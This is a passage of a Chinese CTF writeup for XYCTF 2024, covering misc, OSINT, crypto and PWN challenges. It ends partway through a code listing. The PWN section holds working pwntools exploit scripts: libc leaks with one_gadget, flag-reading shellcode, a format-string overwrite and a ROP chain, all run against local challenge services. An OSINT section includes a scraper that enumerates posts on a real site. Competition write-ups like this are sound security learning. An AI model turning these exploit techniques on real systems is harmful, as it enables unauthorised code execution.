<p>然后一个套一个flag，很明显的明文攻击：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97%E6%98%8E%E6%96%87%E6%94%BB%E5%87%BB.png" class title="ZIP神之套明文攻击">
<img src="/2024/04/26/XYCTF2024-Writeup/ZIP%E7%A5%9E%E4%B9%8B%E5%A5%97flag.png" class title="ZIP神之套flag">
<h3 id="出题有点烦">1.8. 出题有点烦</h3>
<p>flag.7z爆破密码123456</p>
<p>第五个图片能直接作为zip打开(woc 7z这么nb?)</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%87%BA%E9%A2%98%E6%9C%89%E7%82%B9%E7%83%A6%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%9B%BE%E7%89%87.png" class title="出题有点烦第五个图片">
<p>嗯 然后010看到是尾部附加文件，提取出来，再次爆破</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E5%87%BA%E9%A2%98%E6%9C%89%E7%82%B9%E7%83%A6%E9%99%84%E5%8A%A0%E5%86%85%E5%AE%B9.png" class title="出题有点烦附加内容">
<p>密码xyctf，得到真的flag</p>
<p>(欸不是 你那么多图片到底干啥用的?)</p>
<h3 id="真-签到">1.9. 真&gt;签到</h3>
<p>文件打不开就直接拖进010了，然后就 签到了</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%9C%9F%E7%AD%BE%E5%88%B0%E6%96%87%E4%BB%B6%E5%A4%B4.png" class title="真签到文件头">
<h3 id="签到">1.10. 签到</h3>
<p>关注公众号发消息即可</p>
<h3 id="TCPL">1.11. TCPL</h3>
<p>啊?你这不算RE？</p>
<img src="/2024/04/26/XYCTF2024-Writeup/TCPL_DIE%E4%BF%A1%E6%81%AF.png" class title="TCPL_DIE信息">
<p>按照<a target="_blank" rel="noopener" href="https://www.francisz.cn/2021/10/03/riscv-arch-env/">https://www.francisz.cn/2021/10/03/riscv-arch-env/</a> 教程布置一个riscv环境，然后运行即可，把里面的1换成0就是flag（谁叫我user mode不能直接运行起来呢QAQ）</p>
<img src="/2024/04/26/XYCTF2024-Writeup/TCPL%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="TCPL运行结果">
<h3 id="网络追踪">1.12. 网络追踪</h3>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AAShell%E4%BF%A1%E6%81%AF.png" class title="网络追踪Shell信息">
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AAxxencode%E8%A7%A3%E5%AF%86%E7%BB%93%E6%9E%9C.png" class title="网络追踪xxencode解密结果">
<p>靶机IP倒是好找，回显的就是靶机：192.168.204.133</p>
<p>然后以ip.src == 192.168.204.133作为过滤条件，能看到端口扫描的过程：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/%E7%BD%91%E7%BB%9C%E8%BF%BD%E8%B8%AA%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" class title="网络追踪端口扫描">
<p>然后端口就能出来：445、139、135</p>
<p>然后CVE，这个头疼，因为回显的TCP包上面全是SMB包，猜测就是SMB包打的CVE，然后就是根据SMB包的内容一顿去谷歌瞎搜，什么<code>\pipe\spoolss</code>了，什么<code>\PIPE\browser</code>了都可能是攻击点，总之最后一顿搜SMB相关的CVE，最后试flag试出来是<code>CVE-2008-4250</code></p>
<p>完整的flag：<code>XYCTF&#123;192.168.204.133_445_139_135_CVE-2008-4250&#125;</code></p>
<h3 id="Osint1">1.13. Osint1</h3>
<p>因为有人在小红书上问了，小红书作者还回答了地点，所以大致范围就确定了（小红书链接是百度搜图搜出来的）：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Osint1%E7%99%BE%E5%BA%A6%E8%AF%86%E5%9B%BE.png" class title="Osint1百度识图">
<img src="/2024/04/26/XYCTF2024-Writeup/Osint1%E5%B0%8F%E7%BA%A2%E4%B9%A6.png" class title="Osint1小红书">
<p>然后江苏省，南通市，黄海，至于什么路，emmm</p>
<p>因为看另外两张图片有好多风车，就卫星地图把带风车的路都塞一遍就完事了，滨海(东西南北)路我印象里好像都填过一遍</p>
<p>flag：xyctf{江苏省|南通市|滨海东路|黄海}</p>
<h3 id="Osint2">1.14. Osint2</h3>
<p>列车好找(大概?)</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Osint2%E5%88%97%E8%BD%A6%E6%90%9C%E7%B4%A2.png" class title="Osint2列车搜索">
<p>就是你这火车，为啥中途还会变名字啊，搞得我纠结了半天是G3292还是G3293：</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Osint2_12306%E6%88%AA%E5%9B%BE.jpeg" class title="Osint2_12306截图">
<p>省就简单了，都洛阳龙门了那肯定河南啊</p>
<p>至于去哪玩，又是一顿爆猜，总之最后才出来flag：xyctf{G3293|河南省|老君山}</p>
<h3 id="EZ-Base1024-2">1.15. EZ_Base1024*2</h3>
<img src="/2024/04/26/XYCTF2024-Writeup/EZ_Base1024.png" class title="EZ_Base1024">
<h3 id="Ez-osint">1.16. Ez_osint</h3>
<p>首先能找到网站</p>
<img src="/2024/04/26/XYCTF2024-Writeup/Ez_osint.png" class title="Ez_osint">
<p>然后发现这个网站的ID和事件随线性分布，就，找俩时间接近的帖子，在这之间爬一下公开的帖子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(<span class="number">478961</span>,<span class="number">494500</span>)):</span><br><span class="line">    data = requests.get(<span class="string">f&quot;https://www.hi2future.com/Mail/showitem/id/<span class="subst">&#123;i&#125;</span>&quot;</span>,headers=&#123;</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;https://www.hi2future.com/Mail/showitem/id/478961&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    data.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;这封并不是公开信&quot;</span> <span class="keyword">in</span> data.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;不公开&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;公开&quot;</span>)</span><br><span class="line">    sleep(<span class="number">0.05</span>)</span><br></pre></td></tr></table></figure>
<p>然后找到帖子：<a target="_blank" rel="noopener" href="https://www.hi2future.com/Mail/showitem/id/494468">https://www.hi2future.com/Mail/showitem/id/494468</a></p>
<p>这评论区也太难崩了</p>
<h2 id="Crypto">2. Crypto</h2>
<h3 id="happy-to-solve1">2.1. happy_to_solve1</h3>
<p>呃 这题有点太原题了吧</p>
<p>首先一眼看出最大的问题是<code>sympy.nextprime(p ^ ((1 &lt;&lt; 512) - 1))</code></p>
<p>然后去上网搜，毕竟我不会啥密码学</p>
<p>然后就在<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1752%E6%89%BE%E5%88%B0%E4%BA%86">https://forum.butian.net/share/1752找到了</a></p>
<p>题目是2022 zer0pts CTF Anti-Fermat</p>
<p>然后就是把1&lt;&lt;1024换成了1&lt;&lt;512，总之用这个wp的脚本就能解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line">n =  <span class="number">24852206647750545040640868093921252282805229864862413863025873203291042799096787789288461426555716785288286492530194901130042940279109598071958012303179823645151637759103558737126271435636657767272703908384802528366090871653024192321398785017073393201385586868836278447340624427705360349350604325533927890879</span></span><br><span class="line">c =  <span class="number">14767985399473111932544176852718061186100743117407141435994374261886396781040934632110608219482140465671269958180849886097491653105939368395716596413352563005027867546585191103214650790884720729601171517615620202183534021987618146862260558624458833387692782722514796407503120297235224234298891794056695442287</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p=(gmpy2.iroot(<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">1024</span>)-<span class="number">4</span>*n,<span class="number">2</span>)[<span class="number">0</span>]+<span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">512</span>))//<span class="number">2</span></span><br><span class="line">p=<span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    p=sympy.nextprime(p)</span><br><span class="line">    <span class="keyword">if</span>(n%p==<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(m))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">11186104509771514497905845277525414324848282003961401424656189058347435564219816052776565548550435972724614541793612778837623695399649245354880712765072167</span><br><span class="line">b&#x27;XYCTF&#123;3f22f4efe3bbbc71bbcc999a0a622a1a23303cdc&#125;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="Sign1n-签到">2.2. Sign1n[签到]</h3>
<p>难得有我能看得懂的密码学题</p>
<p>就 多加的减回来就行，swap的换回来就行，就是我咋感觉我处理的这么怪：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456799123455779902334577801134557889112456678911344578890233457790013355689902335667990134457799122355689001335668891124566780112455679902334568900133566889113356679901245567990233457790013356688901235667800124556889023346678011335668891223467789023445679902334677801123557889122346779901245577991223566890113455689911234677891224556899023&#x27;</span></span><br><span class="line">s = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s]</span><br><span class="line">s = [(s[i]+<span class="number">10000000</span>-i-<span class="number">1</span>)%<span class="number">10</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">s = <span class="string">&quot;&quot;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">swap_bits</span>(<span class="params">input_str</span>):</span><br><span class="line">    input_list = <span class="built_in">list</span>(input_str)</span><br><span class="line">    length = <span class="built_in">len</span>(input_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length // <span class="number">2</span>):</span><br><span class="line">        temp = input_list[i]</span><br><span class="line">        input_list[i] = input_list[length - <span class="number">1</span> - i]</span><br><span class="line">        input_list[length - <span class="number">1</span> - i] = temp</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(input_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;0&quot;</span>+swap_bits(s))</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\jht3\Downloads\Sign1n&gt; python .\exp.py</span><br><span class="line"><span class="number">011001100110110001100001011001110111101100110101011000010110001100110100011001100110010000111000011000110010110101100010011000100110001000110000001011010011010001100100011000010011010100101101001110000110010001100110001110010010110100111001001101010011000100110110011001010011010001100011001101000011100100110111011001000110010101111101000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>
<img src="/2024/04/26/XYCTF2024-Writeup/Sign1n.png" class title="Sign1n">
<h3 id="Sign1n-Revenge">2.3. Sign1n_Revenge</h3>
<p>内容同Sign1n[签到]，同一个脚本再跑一遍就完事了</p>
<h2 id="PWN">3. PWN</h2>
<p>终于到我PWN的主场了吗(但是我怎么RE做的最多啊喂)</p>
<h3 id="hello-world-签到">3.1. hello_world(签到)</h3>
<p>leak libc然后one gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&quot;./vuln&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11027</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;please input your name: &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Welcome to XYCTF! &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>))</span><br><span class="line">data = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">data = data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)[:<span class="number">8</span>]</span><br><span class="line">data = u64(data)</span><br><span class="line"></span><br><span class="line">libc_base = data-<span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base+<span class="number">0xebc81</span></span><br><span class="line">bss_addr = libc_base+<span class="number">0x21bbb0</span></span><br><span class="line">ret_addr = libc_base+<span class="number">0x29139</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget&#x27;</span>,<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;bss_addr&#x27;</span>,<span class="built_in">hex</span>(bss_addr))</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;please input your name: &#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(bss_addr)+p64(ret_addr)+p64(one_gadget))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="invisible-flag">3.2. invisible_flag</h3>
<p>通过shellcode进行orw，对函数有限制因此使用了openat pread64和sendto</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11036</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">openat(-100,&#x27;flag&#x27;,0,0)</span></span><br><span class="line"><span class="string">pread64(3,0x114514500,64,0)</span></span><br><span class="line"><span class="string">sendto(1,0x114514500,64,0,0,0)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sendto无法在本地打通 只能打远程</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,257</span></span><br><span class="line"><span class="string">mov rdi,-100</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,17</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,0x114514500</span></span><br><span class="line"><span class="string">mov rdx,64</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax,44</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,0x114514500</span></span><br><span class="line"><span class="string">mov rdx,64</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">xor r9,r9</span></span><br><span class="line"><span class="string">xor r8,r8</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">sh.send(shellcode)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmt">3.3. fmt</h3>
<p>通过exit_hooko来onegadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11030</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">ld = ELF(<span class="string">&#x27;ld-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Welcome to xyctf, this is a gift: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = sh.recvline()[:-<span class="number">1</span>]</span><br><span class="line">libc_base = <span class="built_in">eval</span>(libc_base)</span><br><span class="line">libc_base = libc_base - libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + <span class="number">0xe3b2e</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget&#x27;</span>,<span class="built_in">hex</span>(one_gadget))</span><br><span class="line">ld_base = libc_base+<span class="number">0x1f4000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ld_base&#x27;</span>,<span class="built_in">hex</span>(ld_base))</span><br><span class="line">_rtld_global = ld_base+ld.symbols[<span class="string">&quot;_rtld_global&quot;</span>]</span><br><span class="line">_dl_rtld_lock_recursive = _rtld_global + <span class="number">0xf08</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;_dl_rtld_lock_recursive&#x27;</span>,<span class="built_in">hex</span>(_dl_rtld_lock_recursive))</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">sh.send(<span class="string">b&#x27;%7$lld&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(_dl_rtld_lock_recursive))</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(one_gadget).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="static-link">3.4. static_link</h3>
<p>静态链接，直接ORW</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"><span class="comment">#sh = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">11038</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">open64_addr = elf.symbols[<span class="string">&#x27;open64&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts_addr = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">rdi_ret = <span class="number">0x0000000000401f1f</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000409f8e</span></span><br><span class="line">rdx_ret = <span class="number">0x0000000000451322</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x4C7500</span></span><br><span class="line"></span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rsi_ret)+p64(flag_addr)</span><br><span class="line">payload += p64(rdx_ret)+p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(rdi_ret)+p64(flag_addr)</span><br><span class="line">payload += p64(rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open64_addr)</span><br><span class="line">payload += p64(rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(rsi_ret)+p64(flag_addr)</span><br><span class="line">payload += p64(rdx_ret)+p64(<span class="number">64</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(rdi_ret)+p64(flag_addr)</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">sh.send(payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">sh.send(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="one-byte">3.5. one_byte</h3>
<p>我竟然在比赛快结束的时候打鸡血把这题做出来了</p>
<p>之前只做过板题，对堆不熟，这题libc又比较新，就不太想做</p>
<p>总之unsorted bin leak，在leak的时候记得把tcache耗光</p>
<p>然后one_byte让造成chunk extend造成overlapping</p>
<p>然后改tcache的next地址达到任意写修改free_hook为system（tcache的任意写 感觉比fastbin容易多了 fastbin那个任意写我到现在没布局明白）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 